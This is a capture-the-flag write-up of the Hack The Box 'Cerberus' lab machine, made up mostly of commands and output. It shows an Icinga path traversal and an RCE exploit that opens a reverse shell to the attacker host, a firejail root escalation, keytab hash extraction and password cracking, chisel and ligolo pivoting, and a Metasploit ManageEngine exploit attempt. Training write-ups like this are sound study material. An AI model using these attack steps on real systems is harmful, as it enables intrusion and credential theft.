---
tags:
title: Cerberus - Hard (HTB)
permalink: /Cerberus-HTB-Writeup
toc:
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmapf 10.129.232.100
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-12 14:54 -0500
Initiating Ping Scan at 14:54
Scanning 10.129.232.100 [4 ports]
Completed Ping Scan at 14:54, 0.77s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:54
Completed Parallel DNS resolution of 1 host. at 14:54, 0.50s elapsed
Initiating SYN Stealth Scan at 14:54
Scanning 10.129.232.100 [65535 ports]
Discovered open port 8080/tcp on 10.129.232.100
Completed SYN Stealth Scan at 14:55, 15.37s elapsed (65535 total ports)
Nmap scan report for 10.129.232.100
Host is up, received echo-reply ttl 127 (0.55s latency).
Scanned at 2026-02-12 14:54:59 EST for 15s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.79 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 12 (512B)
-e [*] IP: 10.129.232.100
[*] Puertos abiertos: 8080
/usr/bin/xclip
-e [*] Service scanning with nmap against 8080 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-12 14:55 -0500
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 95.30% done; ETC: 14:55 (0:00:00 remaining)
Nmap scan report for 10.129.232.100
Host is up (0.39s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.87 seconds
```

#### /etc/hosts

```bash
addhost 10.129.232.100 icinga.cerberus.local
[+] Added new entry: 10.129.232.100 icinga.cerberus.local to /etc/hosts
10.129.232.100 icinga.cerberus.local
```

## Website

![[Pasted image 20260212165733.png]]

https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/

CVE-2022-24716

```bash
 python3 CVE-2022-24716.py -u http://icinga.cerberus.local:8080/icingaweb2 -p '/etc/passwd'
[+] http://icinga.cerberus.local:8080/icingaweb2 Is Vulnerable see http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/passwd
```

![[Pasted image 20260212171101.png]]

![[Pasted image 20260212171044.png]]

![[Pasted image 20260212171254.png]]

![[Pasted image 20260212171526.png]]

```bash
ssh-keygen -m pem -t rsa -f testing.pem -N ""
Generating public/private rsa key pair.
Your identification has been saved in testing.pem
Your public key has been saved in testing.pem.pub
The key fingerprint is:
SHA256:fpormqYUxYuBXHiin9/k+ldeFM58AB6QOdcoBnHuLUI root@kali
The key's randomart image is:
+---[RSA 3072]----+
|  ..  ooo+o+     |
|.+.o   o*.o.+    |
|o.+ o E..+.+ o   |
|.  + o . .  = .  |
| .o.. . S .. .   |
|  o.  .o .. .    |
|  .. +  .o..     |
| .  o.+ .+.      |
|  .o++.o+.       |
+----[SHA256]-----+
```

```bash
python3 exploit.py -t http://10.129.232.100:8080/icingaweb2 -I 10.10.17.19 -P 4444 -u matthew -p 'IcingaWebPassword2023' -e testing.pem
[INFO] Attempting to login to the Icinga Web 2 instance...
[INFO] Attempting to upload our malicious module...
[SUCCESS] The payload appears to be uploaded successfully!
[INFO] Modifying configurations...
[INFO] Attempting to enable the malicious module...
[INFO] Trying to trigger payload! Have a listener ready!
[SUCCESS] It appears that a reverse shell was started!
[INFO] Removing malicious module file...
[INFO] Disabling malicious module...
[INFO] Resetting website configuration...
[SUCCESS] Cleanup successful! Shutting down...
[ALERT] In the process of exploitation, the application logging has been turned off. Log in manually to reset these settings!
```


```bash
 nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.232.100] 49840
bash: cannot set terminal process group (617): Inappropriate ioctl for device
bash: no job control in this shell
www-data@icinga:/usr/share/icingaweb2/public$ whoami
whoami
www-data
```

```bash
www-data@icinga:/usr/share/icingaweb2$ find / -perm -4000 2>/dev/null
/usr/sbin/ccreds_chkpwd
/usr/bin/mount
/usr/bin/sudo
/usr/bin/firejail
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/ksu
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

https://seclists.org/oss-sec/2022/q2/188

https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#cve-2022-31214-firejail-lpe

```bash
www-data@icinga:/tmp$ ./firejoin_py.bin
You can now run 'firejail --join=1962' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```


```bash
www-data@icinga:/usr/share/icingaweb2/public$ firejail --join=1962
changing root to /proc/1962/root
Warning: cleaning all supplementary groups
Child process initialized in 7.24 ms
www-data@icinga:/usr/share/icingaweb2/public$ sudo su -
www-data is not in the sudoers file.  This incident will be reported.
www-data@icinga:/usr/share/icingaweb2/public$ pkexec /bin/sh
==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
Authentication is needed to run `/bin/sh' as the super user
Authenticating as: root
Password:
www-data@icinga:/usr/share/icingaweb2/public$ firejail --join=1962
Error mkdir: util.c:1141 create_empty_dir_as_root: Value too large for defined data type
www-data@icinga:/usr/share/icingaweb2/public$ su -
root@icinga:~#
```

```bash
root@icinga:/etc/ssh# cat ssh_config

# This is the ssh client system-wide configuration file.  See
# ssh_config(5) for more information.  This file provides defaults for
# users, and the values can be changed in per-user configuration files
# or on the command line.

# Configuration data is parsed as follows:
#  1. command line options
#  2. user-specific file
#  3. system-wide file
# Any configuration value is only changed the first time it is set.
# Thus, host-specific definitions should be at the beginning of the
# configuration file, and defaults at the end.

# Site-wide defaults for some commonly used options.  For a comprehensive
# list of available options, their meanings and defaults, please see the
# ssh_config(5) man page.

Include /etc/ssh/ssh_config.d/*.conf

Host *
#   ForwardAgent no
#   ForwardX11 no
#   ForwardX11Trusted yes
#   PasswordAuthentication yes
#   HostbasedAuthentication no
#   GSSAPIAuthentication no
#   GSSAPIDelegateCredentials no
#   GSSAPIKeyExchange no
#   GSSAPITrustDNS no
#   BatchMode no
#   CheckHostIP yes
#   AddressFamily any
#   ConnectTimeout 0
#   StrictHostKeyChecking ask
#   IdentityFile ~/.ssh/id_rsa
#   IdentityFile ~/.ssh/id_dsa
#   IdentityFile ~/.ssh/id_ecdsa
#   IdentityFile ~/.ssh/id_ed25519
#   Port 22
#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc
#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com
#   EscapeChar ~
#   Tunnel no
#   TunnelDevice any:any
#   PermitLocalCommand no
#   VisualHostKey no
#   ProxyCommand ssh -q -W %h:%p gateway.example.com
#   RekeyLimit 1G 1h
#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
```

```bash
root@icinga:/etc/ssh# cat /etc/krb5.conf
[libdefaults]
default_realm = CERBERUS.LOCAL

# The following krb5.conf variables are only for MIT Kerberos.
	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	proxiable = true
	udp_preference_limit = 0
	default_ccache_name = KCM:
# The following encryption type specification will be used by MIT Kerberos
# if uncommented.  In general, the defaults in the MIT Kerberos code are
# correct and overriding these specifications only serves to disable new
# encryption types as they are added, creating interoperability problems.
#
# The only time when you might need to uncomment these lines and change
# the enctypes is if you have local software that will break on ticket
# caches containing ticket encryption types it doesn't know about (such as
# old versions of Sun Java).

#	default_tgs_enctypes = des3-hmac-sha1
#	default_tkt_enctypes = des3-hmac-sha1
#	permitted_enctypes = des3-hmac-sha1

# The following libdefaults parameters are only for Heimdal Kerberos.
#	fcc-mit-ticketflags = true
#udp_preference_limit = 0

[realms]
	CERBERUS.LOCAL = {
		kdc = DC.cerberus.local
		admin_server = DC.cerberus.local
	}

[domain_realm]
        .cerberus.local = CERBERUS.LOCAL
```

https://github.com/sosdave/KeyTabExtract

```bash
root@icinga:/tmp# python3 keyext.py /etc/krb5.keytab
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : CERBERUS.LOCAL
	SERVICE PRINCIPAL : ICINGA$/
	NTLM HASH : af70cf6b33f1cce788138d459f676faf
	AES-256 HASH : 38df579da95520b9489e85a22aec9d3ca4916d5b9a37ff6f0ecda8eec992479f
	AES-128 HASH : 1241a65425ce5c7a0f06be09e8217274
```

```bash
ATE:1677672476@IDXVERSION2@IDX?name=matthew@cerberus.local,cn=users,cn=cerberus.local,cn=sysdb��Ob�&DN=@INDEX:GIDNUMBER:1000g&@INDEX:GIDNUMBER:1000@IDXVERSION2@IDX?name=matthew@cerberus.local,cn=users,cn=cerberus.local,cn=sysdb��zv�"&DN=@INDEX:UIDNUMBER:1000g&@INDEX:UIDNUMBER:1000@IDXV�ERSION2@IDX?name=matthew@cerberus.local,cn=users,cn=cerberus.local,cn=sysdb�� �E&DN=@INDEX:DATAEXPIRETIMESTAMP:0g&@INDEX:DATAEXPIRETIMESTAMP:0@IDXVERSION2@IDX?name=matthew@cerberus.local,cn=users,cn=cerberus.local,cn=sysdb�C3<1�)&DN=NAME=matthew@cerberus.local,CN=USERS,CN=CERBERUname=matthew@cerberus.local,cn=users,cn=cerberus.local,cn=sysdbcreateTimestamp
1677672476gidNumber1000namematthew@cerberus.localobjectCategoryuseruidNumber1000isPosixTRUElastUpdate
1677672476dataExpireTimestamp0initgrExpireTimestamp0cachedPasswordj$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0cachedPasswordType1lastCachedPasswordChange
1677672476failedLoginAttempts0aExpireTimestamp0initgrExpireTimestamp0seruidNumber10000a)]�&DN=@INDEX:CN:GROUPSg&@INDEX:CN:GROUPS@IDXVERSION2@IDX$cn=groups,cn=cerberus.local,cn=sysdb�(?�-&DN=CN=GROUPS,CN=CERBERUS.LOCAL,CN=SYSDBg&cn=groups,cn=cerberus.local,cn=sysdbcnGroups_Xkљ&DN=@INDEX:CN:USERSg&@INDEX:CN:USERS@IDXVERSION2@IDX#cn=users,cn=cerberus.local,cn=sysdb�'=*;g&DN=CN=USERS,CN=CERBERUS.LOCAL,CN=SYSDBg&cn=users,cn=cerberus.local,cn=sysdbcnUsers�_�+�&DN=@INDEX:CN:CERBERUS.LOCALg&@INDEX:CN:CERBERUS.LOCAL@IDXVERSION2@IDXcn=cerberus.local,cn=sysdb��x=FX�Wf���DN=CN=CERBERUS.LOCAL,CN=SYSDBg&cn=cerberus.local,cn=sysdbcncerberus.localO�ڙ&DN=@INDEX:CN:RANGESg&@INDEX:CN:RANGES@IDXVERSION2@IDXcn=ranges,cn=sysdbX-őod&DN=CN=RANGES,CN=SYSDBg&cn=ranges,cn=sysdbcnrangesppDdm�&DN=@INDEX:CN:SYSDBg&@INDEX:CN:SYSDB@IDXVERSION2@IDcn=sysdb
                                                                              W7�~7&DN=CN=SYSDBg&cn=sysdbcnsysdbdescription
                                                                                                                           base objectversion0.23\��d&DN=@INDEXLISTg&@INDEXLIST@IDXATTRcn
                                                                                                                                                                                         objectclassmembememberofname	uidNumber	gidNumber
lastUpdatedataExpireTimestamp
originalDN	nameAlias
                         servicePortserviceProtocosudoUsersshKnownHostsExpireobjectSIDStringghostuserPrincipalNamecanonicalUserPrincipalNamuniqueIDmailuserMappedCertificate
ccacheFile
R�W&DN=@BASEINFOg&@BASEINFOsequenceNumber18whenChanged20230302123344.0Z�_d[δ&DN=@ATTRIBUTESg&	@ATTRIBUTEScanonicalUserPrincipalNameCASE_INSENSITIVEcnCASE_INSENSITIVEdcCASE_INSENSITIVEdnCASE_INSENSITIVEipHostNumberCASE_INSENSITIVEipNetworkNumberCASE_INSENSITIVEobjectclassCASE_INSENSITIVEoriginalDNCASE_INSENSITIVEuserPrincipalNameCASE_INSENSITIVE�L
                                                                                                                                                                 ,o�ʙ&DN=@MODULESg&@MODULES@LIST
   asq,memberofd��'a)]�&DN=@INDEX:CN:GROUPSg&@INDEX:CN:GROUPS@IDXVERSION2@IDX$cn=groups,cn=cerberus.local,cn=sysdb�(?�-&DN=CN=GROUPS,CN=CERBERUS.LOCAL,CN=SYSDBg&cn=groups,cn=cerberus.local,cn=sysdbcnGroups_Xkљ&DN=@INDEX:CN:USERSg&@INDEX:CN:USERS@IDXVERSION2@IDX#cn=users,cn=cerberus.local,cn=sysdb�'=*;g&DN=CN=USERS,CN=CERBERUS.LOCAL,CN=SYSDBg&cn=users,cn=cerberus.local,cn=sysdbcnUsers�_�+�&DN=@INDEX:CN:CERBERUS.LOCALg&@INDEX:CN:CERBERUS.LOCAL@IDXVERSION2@IDXcn=cerberus.local,cn=sysdb�x=FX�W&DN=CN=CERBERUS.LOCAL,CN=SYSDBg&cn=cerberus.local,cn=sysdbcncerberus.localO�ڙ&DN=@INDEX:CN:RANGESg&@INDEX:CN:RANGES@IDXVERSION2@IDXcn=ranges,cn=sysdbX-őod&DN=CN=RANGES,CN=SYSDBg&cn=ranges,cn=sysdbcnrangesppDdm�&DN=@INDEX:CN:SYSDBg&@INDEX:CN:SYSDB@IDXVERSION2@Icn=sysdb
      W7�~7&DN=CN=SYSDBg&cn=sysdbcnsysdbdescription
                                                   base objectversion0.23\��d&DN=@INDEXLISTg&@INDEXLIST@IDXATTRcn
                                                                                                                 objectclassmembememberofname	uidNumber	gidNumber
lastUpdatedataExpireTimestamp
originalDN	nameAlias
                         servicePortserviceProtocosudoUsersshKnownHostsExpireobjectSIDStringghostuserPrincipalNamecanonicalUserPrincipalNamuniqueIDmailuserMappedCertificate
ccacheFile
Q�W&DN=@BASEINFOg&@BASEINFOwhenChanged20230301120756.0ZsequenceNumber9�_d[δ&DN=@ATTRIBUTESg&	@ATTRIBUTEScanonicalUserPrincipalNameCASE_INSENSITIVEcnCASE_INSENSITIVEdcCASE_INSENSITIVEdnCASE_INSENSITIVEipHostNumberCASE_INSENSITIVEipNetworkNumberCASE_INSENSITIVEobjectclassCASE_INSENSITIVEoriginalDNCASE_INSENSITIVEuserPrincipalNameCASE_INSENSITIVE�L
                                                                                                                                                                 ,o�ʙ&DN=@MODULESg&@MODULES@LIST
```

```bash
j hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
147258369        (?)
1g 0:00:00:00 DONE (2026-02-12 16:15) 8.333g/s 8533p/s 8533c/s 8533C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2

```bash
# sudo ip tuntap add dev ligolo mode tun

┌──(root㉿kali)-[/home/zsln/Downloads]
└─# sudo ip link set ligolo up
```


```bash
root@icinga:/tmp# ./agent -connect 10.10.17.19:443 -ignore-cert
WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established                        addr="10.10.17.19:443"
```

```bash
[Agent : root@icinga] » interface_create --name ligoloo
INFO[0255] Creating a new ligoloo interface...
INFO[0255] Interface created!
[Agent : root@icinga] » interface_add_route --name ligoloo --route 172.16.22.0/28
INFO[0265] Route created.
[Agent : root@icinga] » start
INFO[0268] Starting tunnel to root@icinga (00155d5fe801)
```


```bash
chisel_socks 10.10.17.19 5555
[+] copied chisel client -v 10.10.17.19:5555 R:socks in clipboard
2026/02/12 16:18:29 server: Reverse tunnelling enabled
2026/02/12 16:18:29 server: Fingerprint A45bQqE3CYWmOprQlkBHCcdBHFqPILyB3RGJN8pOZtg=
2026/02/12 16:18:29 server: Listening on http://0.0.0.0:5555
```

```bash
root@icinga:/tmp# ././chisel client -v 10.10.17.19:5555 R:socks
2026/02/12 21:21:43 client: Connecting to ws://10.10.17.19:5555
2026/02/12 21:21:45 client: Handshaking...
2026/02/12 21:21:49 client: Sending config
2026/02/12 21:21:49 client: Connected (Latency 820.0981ms)
2026/02/12 21:21:49 client: tun: SSH connected
2026/02/12 21:22:37 client: tun: conn#1: Open [1/1]
```


```powershell
evil-winrm -i 172.16.22.1 -u matthew -p 147258369

Evil-WinRM shell v3.9


Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\matthew\Documents> type ../desktop/user.txt
b060d2b43dadc836c5ac6566ab49f1be
```

```bash
*Evil-WinRM* PS C:\program files (x86)\ManageEngine\ADSelfService Plus\Backup> ls


    Directory: C:\program files (x86)\ManageEngine\ADSelfService Plus\Backup


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/16/2025  10:14 PM         636500 250516-221358.ezip
-a----        2/15/2023   7:16 AM         320225 OfflineBackup_20230214064809.ezip
```

```bash
echo OfflineBackup_20230214064809 | rev
90846041203202_pukcaBenilffO

┌──(root㉿kali)-[/home/zsln/Desktop/zsln/Cerberus]
└─# 7z x OfflineBackup_20230214064809.ezip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 320225 bytes (313 KiB)

Extracting archive: OfflineBackup_20230214064809.ezip
--
Path = OfflineBackup_20230214064809.ezip
Type = 7z
Physical Size = 320225
Headers Size = 8337
Method = LZMA2:3m 7zAES
Solid = +
Blocks = 1


Enter password (will not be echoed):

Would you like to replace the existing file:
  Path:     ./hash.txt
  Size:     22321 bytes (22 KiB)
  Modified: 2026-02-12 17:00:03
with the file from archive:
  Path:     hash.txt
  Size:     61 bytes (1 KiB)
  Modified: 2023-02-15 09:28:38
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

Everything is Ok

Files: 979
Size:       2559925
Compressed: 320225
```

![[Pasted image 20260212190252.png]]

```powershell
*Evil-WinRM* PS C:\programdata> upload chisel.exe

Info: Uploading /home/zsln/Desktop/zsln/Cerberus/chisel.exe to C:\programdata\chisel.exe

Data: 14149632 bytes of 14149632 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> .\chisel.exe client 10.10.17.19:5555 R:socks
chisel.exe : 2026/02/12 14:32:02 client: Connecting to ws://10.10.17.19:5555
    + CategoryInfo          : NotSpecified: (2026/02/12 14:3...0.10.17.19:5555:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2026/02/12 14:32:08 client: Connected (Latency 410.1205ms)
```

```bash
chisel_socks 10.10.17.19 5555
[+] copied chisel client -v 10.10.17.19:5555 R:socks in clipboard
2026/02/12 17:28:54 server: Reverse tunnelling enabled
2026/02/12 17:28:54 server: Fingerprint QNakoIPjx2baSj++Eb1kjk+K0OCvZIr2V9FR+z6bNos=
2026/02/12 17:28:54 server: Listening on http://0.0.0.0:5555
2026/02/12 17:28:59 server: session#1: Handshaking with 10.129.232.100:54597...
```


```bash
msfconsole -q
msf > # bryan@red_team (msfconsole)
[-] Unknown command: #. Run the help command for more details.
msf > use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966
[*] Using configured payload cmd/windows/powershell/meterpreter/reverse_tcp
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set target 0
target => 0
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set payload windows/x64/meterpreter/reverse_tcp_rc4
payload => windows/x64/meterpreter/reverse_tcp_rc4
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set lhost tun0
lhost => tun0
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set lport 8000
lport => 8000
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set rc4password mryFnlywB9_N8gvc
rc4password => mryFnlywB9_N8gvc
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set guid 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
guid => 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set issuer_url http://dc.cerberus.local/adfs/services/trust
issuer_url => http://dc.cerberus.local/adfs/services/trust
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > exploit
^L[*] Started reverse TCP handler on 10.10.17.19:8000
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) >
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > ls
[*] exec: ls

CVE-2022-47966.py  README.md
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) >
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > options

Module options (exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966):

   Name         Current Setting          Required  Description
   ----         ---------------          --------  -----------
   GUID         67a8d101690402dc6a6744b  yes       The SAML endpoint GUID
                8fc8a7ca1acf88b2f
   ISSUER_URL   http://dc.cerberus.loca  yes       The Issuer URL used by the Identity Pro
                l/adfs/services/trust              vider which has been configured as the
                                                   SAML authentication provider for the ta
                                                   rget server
   Proxies                               no        A proxy chain of format type:host:port[
                                                   ,type:host:port][...]. Supported proxie
                                                   s: sapni, socks4, http, socks5, socks5h
   RELAY_STATE                           no        The Relay State. Default is "http(s)://
                                                   <rhost>:<rport>/samlLogin/LoginAuth"
   RHOSTS       127.0.0.1                yes       The target host(s), see https://docs.me
                                                   tasploit.com/docs/using-metasploit/basi
                                                   cs/using-metasploit.html
   RPORT        9251                     yes       The target port (TCP)
   SSL          true                     no        Negotiate SSL/TLS for outgoing connecti
                                                   ons
   SSLCert                               no        Path to a custom SSL certificate (defau
                                                   lt is randomly generated)
   TARGETURI    /samlLogin               yes       The SAML endpoint URL
   URIPATH                               no        The URI to use for this exploit (defaul
                                                   t is random)
   VHOST                                 no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. T
                                       his must be an address on the local machine or 0.0.
                                       0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/x64/meterpreter/reverse_tcp_rc4):

   Name         Current Setting   Required  Description
   ----         ---------------   --------  -----------
   EXITFUNC     process           yes       Exit technique (Accepted: '', seh, thread, pro
                                            cess, none)
   LHOST        tun0              yes       The listen address (an interface may be specif
                                            ied)
   LPORT        8000              yes       The listen port
   RC4PASSWORD  mryFnlywB9_N8gvc  yes       Password to derive RC4 key from


Exploit target:

   Id  Name
   --  ----
   0   Windows EXE Dropper



View the full module info with the info, or info -d command.

msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set lhost 10.10.17.19
lhost => 10.10.17.19
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set lport 4444
lport => 4444
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) >
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set payload windows/x64/meterpreter/reverse_tcp_rc4
payload => windows/x64/meterpreter/reverse_tcp_rc4
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set guid 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
guid => 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
ISSUER_URL => http://dc.cerberus.local/adfs/services/trust
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > help

Core Commands
=============

    Command           Description
    -------           -----------
    ?                 Help menu
    banner            Display an awesome metasploit banner
    cd                Change the current working directory
    color             Toggle color
    connect           Communicate with a host
    debug             Display information useful for debugging
    exit              Exit the console
    features          Display the list of not yet released features that can be opted in to
    get               Gets the value of a context-specific variable
    getg              Gets the value of a global variable
    grep              Grep the output of another command
    help              Help menu
    history           Show command history
    load              Load a framework plugin
    quit              Exit the console
    repeat            Repeat a list of commands
    route             Route traffic through a session
    save              Saves the active datastores
    sessions          Dump session listings and display information about sessions
    set               Sets a context-specific variable to a value
    setg              Sets a global variable to a value
    sleep             Do nothing for the specified number of seconds
    spool             Write console output into a file as well the screen
    threads           View and manipulate background threads
    tips              Show a list of useful productivity tips
    unload            Unload a framework plugin
    unset             Unsets one or more context-specific variables
    unsetg            Unsets one or more global variables
    version           Show the framework and console library version numbers


Module Commands
===============

    Command           Description
    -------           -----------
    advanced          Displays advanced options for one or more modules
    back              Move back from the current context
    clearm            Clear the module stack
    favorite          Add module(s) to the list of favorite modules
    favorites         Print the list of favorite modules (alias for `show favorites`)
    info              Displays information about one or more modules
    listm             List the module stack
    loadpath          Searches for and loads modules from a path
    options           Displays global options or for one or more modules
    popm              Pops the latest module off the stack and makes it active
    previous          Sets the previously loaded module as the current module
    pushm             Pushes the active or list of modules onto the module stack
    reload_all        Reloads all modules from all defined module paths
    search            Searches module names and descriptions
    show              Displays modules of a given type, or all modules
    use               Interact with a module by name or search term/index


Job Commands
============

    Command           Description
    -------           -----------
    handler           Start a payload handler as job
    jobs              Displays and manages jobs
    kill              Kill a job
    rename_job        Rename a job


Resource Script Commands
========================

    Command           Description
    -------           -----------
    makerc            Save commands entered since start to a file
    resource          Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific address or address range
    certs             List Pkcs12 certificate bundles in the database
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the default to reconnect on startup
    db_stats          Show statistics for the database
    db_status         Show the current data service status
    hosts             List all hosts in the database
    klist             List Kerberos tickets in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Credentials Backend Commands
============================

    Command           Description
    -------           -----------
    creds             List all credentials in the database


Developer Commands
==================

    Command           Description
    -------           -----------
    edit              Edit the current module or a file with the preferred editor
    irb               Open an interactive Ruby shell in the current context
    log               Display framework.log paged to the end if possible
    pry               Open the Pry debugger on the current module or Framework
    reload_lib        Reload Ruby library files from specified paths
    time              Time how long it takes to run a particular command


DNS Commands
============

    Command           Description
    -------           -----------
    dns               Manage Metasploit's DNS resolving behaviour


Exploit Commands
================

    Command           Description
    -------           -----------
    check             Check to see if a target is vulnerable
    exploit           Launch an exploit attempt
    rcheck            Reloads the module and checks if the target is vulnerable
    recheck           Alias for rcheck
    reload            Just reloads the module
    rerun             Alias for rexploit
    rexploit          Reloads the module and launches an exploit attempt
    run               Alias for exploit

For more info on a specific command, use <command> -h or help <command>.


msfconsole
==========

`msfconsole` is the primary interface to Metasploit Framework. There is quite a
lot that needs go here, please be patient and keep an eye on this space!

Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.

### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.

### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)

### Examples

Terminate the first sessions:

    sessions -k 1

Stop some extra running jobs:

    jobs -k 2-6,7,8,11..15

Check a set of IP addresses:

    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255

Target a set of IPv6 hosts:

    set RHOSTS fe80::3990:0000/110, ::1-::f0f0

Target a block from a resolved domain name:

    set RHOSTS www.example.test/24
msf exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > options
